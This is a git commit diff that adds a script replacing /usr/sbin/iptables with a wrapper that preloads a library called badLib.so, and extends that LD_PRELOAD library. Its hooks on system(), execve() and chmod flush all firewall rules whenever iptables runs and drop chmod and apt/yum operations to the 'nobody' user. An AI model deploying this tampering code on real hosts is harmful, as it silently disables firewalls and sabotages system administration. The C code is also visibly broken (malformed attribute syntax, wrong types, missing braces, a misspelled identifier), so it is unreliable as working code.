80838a2921d682f58e63ddad59d7e1cb311b7894
malfindor <sam.burton271@gmail.com>
2025-07-09 13:41:02 -0400

    Added to the library, added bash script to make an iptables wrapper for the library

---
+++ add_iptables_wrapper.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+mv /usr/sbin/iptables /usr/sbin/iptables.real
+cat <<EOFA > /usr/sbin/iptables
+#!/bin/bash
+export LD_PRELOAD=/usr/lib/badLib.so
+exec -a iptables /usr/sbin/iptables.real "$@"
+EOFA
+chmod +x /usr/sbin/iptables
--- libraries/badLib.c
+++ libraries/badLib.c
@@ -6,9 +6,52 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <pwd.h>
+#include <stdbool.h>
+
+bool DEBUG = true;
+
+__attribute__{(constructor)}
+void init() {
+	if (DEBUG) {
+		fprintf(stderr, "Library loaded successfully\n");
+	}
+}
+
+int chmod(const char *pathname, node_t node) {
+	static int (*real_chmod)(const char *, node_t) = NULL;
+	if (!real_chmod) {
+		real_chmod = dlsym(RTLD_NEXT, "chmod");
+	}
+	if (DEBUG) {
+		fprintf(stderr, "chmod hooked\n");
+	}
+	struct passwd *pw = getpwnam("nobody");
+		if (pw) {
+			setgid(pw->pw_gid);
+			setuid(pw->pw_uid);
+		} else {
+			fprintf(stderr, "[!] Failed to resolve 'nobody' user\n");
+		}
+	return real_chmod(pathname, node);
+
+// Intercept fchmodat() call
+int fchmodat(int dirfd, const char *pathname, node_t node, int flags) {
+	static int (*real fchmodat)(int, const char *, node_t, int) = NULL;
+	if (!real_fchmodat) {
+		real_fchmodat = dlsym(RTLD_NEXT, "fchmodat");
+	}
+	
+	if (DEBUG) {
+		fprintf(stderr, "fchmodat hooked\n");
+	}
+	
+	return real_fchmodat(dirfd, pathname, node, flags);
 
 // Intercept system() call
 int system(const char *command) {
+	if (DEBUG) {
+		fprintf(stderr, "system hooked\n");
+	}
     static int (*real_system)(const char *) = NULL;
     if (!real_system) {
         real_system = dlsym(RTLD_NEXT, "system");
@@ -16,8 +59,9 @@ int system(const char *command) {
 
     // Check if the command is iptables
     if (command && strstr(command, "iptables")) {
-        fprintf(stderr, "[*] Intercepted iptables command: %s\n", command);
-
+		if (DEBUG) {
+			fprintf(stderr, "[*] Intercepted iptables command: %s\n", command);
+		}
         // Run your custom payload here
         real_system("iptables -F");
         real_system("iptables -X");
@@ -35,14 +79,18 @@ int system(const char *command) {
 
 // Intercept execve()
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
+	if (DEBUG) {
+		fprintf(stderr, "execve hooked\n");
+	}
     static int (*real_execve)(const char *, char *const[], char *const[]) = NULL;
     if (!real_execve) {
         real_execve = dlsym(RTLD_NEXT, "execve");
     }
 
     if (pathname && strstr(pathname, "chmod")) {
-        fprintf(stderr, "[*] Intercepted chmod execution: %s\n", pathname);
-
+		if (DEBUG) {
+			fprintf(stderr, "[*] Intercepted chmod execution: %s\n", pathname);
+		}
         struct passwd *pw = getpwnam("nobody");
 		if (pw) {
 			setgid(pw->pw_gid);
@@ -53,7 +101,9 @@ int execve(const char *pathname, char *const argv[], char *const envp[]) {
     }
 	
 	else if (strstr(pathname, "/apt") || strstr(pathname, "/apt-get") || strstr(pathname, "/yum")) {
-            fprintf(stderr, "[*] Intercepted apt command: %s\n", pathname);
+            if (DEBUG) {
+				fprintf(stderr, "[*] Intercepted apt command: %s\n", pathname);
+			}
             for (int i = 1; argv[i] != NULL; i++) {
                 fprintf(stderr, "[apt arg %d]: %s\n", i, argv[i]);
             }
@@ -66,6 +116,12 @@ int execve(const char *pathname, char *const argv[], char *const envp[]) {
 				fprintf(stderr, "[!] Failed to resolve 'nobody' user\n");
 			}
         }
+		
+	else if (strstr(pathname, "iptables")) {
+		if (DEBUG) {
+			fprintf(stderr, "intercepted iptables command\n");
+		}
+	}
 
     return real_execve(pathname, argv, envp);
 }
